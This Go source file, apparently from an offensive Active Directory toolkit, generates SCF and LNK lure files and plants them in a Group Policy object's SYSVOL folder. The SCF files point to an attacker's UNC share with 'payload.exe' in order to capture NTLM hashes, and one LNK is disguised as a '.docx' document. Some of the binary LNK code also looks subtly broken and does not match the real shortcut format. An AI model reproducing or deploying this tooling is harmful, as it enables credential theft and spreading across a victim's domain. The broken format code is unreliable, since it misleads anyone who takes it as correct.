package gpo

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type SCFConfig struct {
	Target    string
	Listener  string
	OutputDir string
}

type LNKConfig struct {
	Target    string
	Icon      string
	OutputDir string
	Comment   string
}

type SCFFile struct {
	ShellExecute string
	IconIndex    int
}

type LNKFile struct {
	CLSID          [16]byte
	Flags          uint32
	FileAttributes uint32
	CreationTime   uint64
	AccessTime     uint64
	WriteTime      uint64
	FileSize       uint32
	IconIndex      int32
	CommandFlags   uint32
	ShowCommand    uint32
	HotKey         uint16
	Reserved       [10]byte
	Name           string
	Target         string
}

func GenerateSCF(config *SCFConfig) (string, error) {
	if config.OutputDir == "" {
		config.OutputDir = "."
	}

	scfContent := fmt.Sprintf(`[Shell]
Command=2
IconFile=\\\\%s\\share\\icon.ico
CommandArgument=\\\\%s\\share\\payload.exe
[Shell\Default]
Command=2
IconFile=\\\\%s\\share\\icon.ico
CommandArgument=\\\\%s\\share\\payload.exe
`, config.Listener, config.Listener, config.Listener, config.Listener)

	filename := fmt.Sprintf("scf_%s_%d.scf", config.Target, time.Now().Unix())
	filePath := config.OutputDir + "/" + filename

	if err := os.WriteFile(filePath, []byte(scfContent), 0644); err != nil {
		return "", fmt.Errorf("write SCF file: %w", err)
	}

	return filePath, nil
}

func GenerateSCFHash(config *SCFConfig) (string, error) {
	if config.OutputDir == "" {
		config.OutputDir = "."
	}

	scfContent := fmt.Sprintf(`[Shell]
Command=2
IconFile=\\\\%s\\share\\icon.ico
CommandArgument=\\\\%s\\share\\payload.exe
`, config.Listener, config.Listener)

	filename := fmt.Sprintf("scf_hash_%s_%d.scf", config.Target, time.Now().Unix())
	filePath := config.OutputDir + "/" + filename

	if err := os.WriteFile(filePath, []byte(scfContent), 0644); err != nil {
		return "", fmt.Errorf("write SCF file: %w", err)
	}

	return filePath, nil
}

func GenerateLNK(config *LNKConfig) (string, error) {
	if config.OutputDir == "" {
		config.OutputDir = "."
	}

	lnk := &LNKFile{
		CLSID: [16]byte{
			0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
			0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
		},
		Flags:          0x00000001,
		FileAttributes: 0x00000020,
		CreationTime:   getWindowsTime(time.Now()),
		AccessTime:     getWindowsTime(time.Now()),
		WriteTime:      getWindowsTime(time.Now()),
		IconIndex:      0,
		CommandFlags:   0x00000001,
		ShowCommand:    1,
		Name:           config.Target,
		Target:         config.Target,
	}

	data := lnk.Marshal()

	filename := fmt.Sprintf("lnk_%s_%d.lnk", config.Target, time.Now().Unix())
	filePath := config.OutputDir + "/" + filename

	if err := os.WriteFile(filePath, data, 0644); err != nil {
		return "", fmt.Errorf("write LNK file: %w", err)
	}

	return filePath, nil
}

func GenerateLNKMSWord(config *LNKConfig) (string, error) {
	if config.OutputDir == "" {
		config.OutputDir = "."
	}

	filename := fmt.Sprintf("document_%s_%d.docx.lnk", config.Target, time.Now().Unix())
	filePath := config.OutputDir + "/" + filename

	content := fmt.Sprintf(`Windows Shortcut
Target: %s
Icon: %s
Comment: %s
`, config.Target, config.Icon, config.Comment)

	if err := os.WriteFile(filePath, []byte(content), 0644); err != nil {
		return "", fmt.Errorf("write LNK file: %w", err)
	}

	return filePath, nil
}

func GenerateSCFBinary(config *SCFConfig) ([]byte, error) {
	scfContent := fmt.Sprintf(`[Shell]
Command=2
IconFile=\\\\%s\\share\\icon.ico
CommandArgument=\\\\%s\\share\\payload.exe
`, config.Listener, config.Listener)

	return []byte(scfContent), nil
}

func GenerateLNKBinary(config *LNKConfig) ([]byte, error) {
	lnk := &LNKFile{
		CLSID: [16]byte{
			0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
			0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
		},
		Flags:          0x00000001,
		FileAttributes: 0x00000020,
		CreationTime:   getWindowsTime(time.Now()),
		AccessTime:     getWindowsTime(time.Now()),
		WriteTime:      getWindowsTime(time.Now()),
		IconIndex:      0,
		CommandFlags:   0x00000001,
		ShowCommand:    1,
		Name:           config.Target,
		Target:         config.Target,
	}

	return lnk.Marshal(), nil
}

func (l *LNKFile) Marshal() []byte {
	var buf []byte

	buf = append(buf, l.CLSID[:]...)

	buf = appendUint32LE(buf, l.Flags)
	buf = appendUint32LE(buf, l.FileAttributes)
	buf = appendUint64LE(buf, l.CreationTime)
	buf = appendUint64LE(buf, l.AccessTime)
	buf = appendUint64LE(buf, l.WriteTime)
	buf = appendUint32LE(buf, l.FileSize)
	buf = appendInt32LE(buf, l.IconIndex)
	buf = appendUint32LE(buf, l.CommandFlags)
	buf = appendUint32LE(buf, l.ShowCommand)
	buf = appendUint16LE(buf, l.HotKey)
	buf = append(buf, l.Reserved[:]...)

	nameBytes := []byte(l.Name)
	buf = appendUint16LE(buf, uint16(len(nameBytes)))
	buf = append(buf, nameBytes...)
	buf = append(buf, 0)

	targetBytes := []byte(l.Target)
	buf = appendUint16LE(buf, uint16(len(targetBytes)))
	buf = append(buf, targetBytes...)
	buf = append(buf, 0)

	return buf
}

func getWindowsTime(t time.Time) uint64 {
	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
	return uint64(t.Sub(epoch).Nanoseconds() / 100)
}

func appendUint16LE(buf []byte, v uint16) []byte {
	return append(buf, byte(v), byte(v>>8))
}

func appendUint32LE(buf []byte, v uint32) []byte {
	return append(buf, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func appendUint64LE(buf []byte, v uint64) []byte {
	return append(buf, byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
		byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56))
}

func appendInt32LE(buf []byte, v int32) []byte {
	return appendUint32LE(buf, uint32(v))
}

func ParseSCF(content string) map[string]string {
	result := make(map[string]string)
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "[") || line == "" {
			continue
		}
		if idx := strings.Index(line, "="); idx > 0 {
			key := strings.TrimSpace(line[:idx])
			value := strings.TrimSpace(line[idx+1:])
			result[key] = value
		}
	}
	return result
}

func ParseLNK(data []byte) (*LNKFile, error) {
	if len(data) < 76 {
		return nil, fmt.Errorf("LNK file too short")
	}

	lnk := &LNKFile{}
	copy(lnk.CLSID[:], data[0:16])

	lnk.Flags = binary.LittleEndian.Uint32(data[16:20])
	lnk.FileAttributes = binary.LittleEndian.Uint32(data[20:24])
	lnk.CreationTime = binary.LittleEndian.Uint64(data[24:32])
	lnk.AccessTime = binary.LittleEndian.Uint64(data[32:40])
	lnk.WriteTime = binary.LittleEndian.Uint64(data[40:48])
	lnk.FileSize = binary.LittleEndian.Uint32(data[48:52])
	lnk.IconIndex = int32(binary.LittleEndian.Uint32(data[52:56]))
	lnk.CommandFlags = binary.LittleEndian.Uint32(data[56:60])
	lnk.ShowCommand = binary.LittleEndian.Uint32(data[60:64])
	lnk.HotKey = binary.LittleEndian.Uint16(data[64:66])
	copy(lnk.Reserved[:], data[66:76])

	offset := 76
	if offset+2 <= len(data) {
		nameLen := int(binary.LittleEndian.Uint16(data[offset : offset+2]))
		offset += 2
		if offset+nameLen <= len(data) {
			lnk.Name = string(data[offset : offset+nameLen])
			offset += nameLen
		}
	}

	return lnk, nil
}

func DeploySCFViaGPO(gpoGUID, sysvolPath, listenerIP, target string) (string, error) {
	config := &SCFConfig{
		Target:   target,
		Listener: listenerIP,
	}

	scfPath, err := GenerateSCF(config)
	if err != nil {
		return "", fmt.Errorf("generate SCF: %w", err)
	}

	gpoPath := findGPOPath(gpoGUID, sysvolPath)
	if gpoPath == "" {
		return "", fmt.Errorf("GPO path not found for GUID: %s", gpoGUID)
	}

	fileDir := filepath.Join(gpoPath, "Machine", "Files")
	if err := os.MkdirAll(fileDir, 0755); err != nil {
		return "", fmt.Errorf("create files dir: %w", err)
	}

	scfData, err := os.ReadFile(scfPath)
	if err != nil {
		return "", fmt.Errorf("read SCF: %w", err)
	}

	destFile := filepath.Join(fileDir, filepath.Base(scfPath))
	if err := os.WriteFile(destFile, scfData, 0644); err != nil {
		return "", fmt.Errorf("write SCF to SYSVOL: %w", err)
	}

	return destFile, nil
}

func DeployLNKViaGPO(gpoGUID, sysvolPath, target, icon, comment string) (string, error) {
	config := &LNKConfig{
		Target:  target,
		Icon:    icon,
		Comment: comment,
	}

	lnkPath, err := GenerateLNK(config)
	if err != nil {
		return "", fmt.Errorf("generate LNK: %w", err)
	}

	gpoPath := findGPOPath(gpoGUID, sysvolPath)
	if gpoPath == "" {
		return "", fmt.Errorf("GPO path not found for GUID: %s", gpoGUID)
	}

	fileDir := filepath.Join(gpoPath, "Machine", "Files")
	if err := os.MkdirAll(fileDir, 0755); err != nil {
		return "", fmt.Errorf("create files dir: %w", err)
	}

	lnkData, err := os.ReadFile(lnkPath)
	if err != nil {
		return "", fmt.Errorf("read LNK: %w", err)
	}

	destFile := filepath.Join(fileDir, filepath.Base(lnkPath))
	if err := os.WriteFile(destFile, lnkData, 0644); err != nil {
		return "", fmt.Errorf("write LNK to SYSVOL: %w", err)
	}

	return destFile, nil
}

func GenerateSCFHashString(listenerIP string) string {
	return fmt.Sprintf(`[Shell]
Command=2
IconFile=\\\\%s\\share\\icon.ico
CommandArgument=\\\\%s\\share\\payload.exe
`, listenerIP, listenerIP)
}

func GenerateLNKString(target, icon, comment string) string {
	return fmt.Sprintf(`Windows Shortcut
Target: %s
Icon: %s
Comment: %s
`, target, icon, comment)
}

func GenerateSCFHex(listenerIP string) string {
	scf := GenerateSCFHashString(listenerIP)
	return hex.EncodeToString([]byte(scf))
}

func GenerateLNKHex(target, icon, comment string) string {
	lnk := GenerateLNKString(target, icon, comment)
	return hex.EncodeToString([]byte(lnk))
}
